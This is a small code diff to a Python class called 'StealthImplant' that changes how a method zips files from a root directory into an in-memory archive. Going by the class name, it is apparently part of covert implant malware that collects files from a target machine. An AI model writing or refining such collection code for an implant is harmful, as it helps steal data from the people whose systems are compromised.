@@ -85,8 +85,8 @@ class StealthImplant:
         with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
             for path in files:
                 try:
-                    rel_path = path.relative_to(self.root_dir)
-                    zf.write(path, rel_path)
+                    arcname = str(Path(self.root_dir.name)/ path.relative_to(self.root_dir))
+                    zf.write(path, arcname)
                 except Exception as e:
                     self._log(f"skipped {path}: {e}")
         return zip_buffer.getvalue()
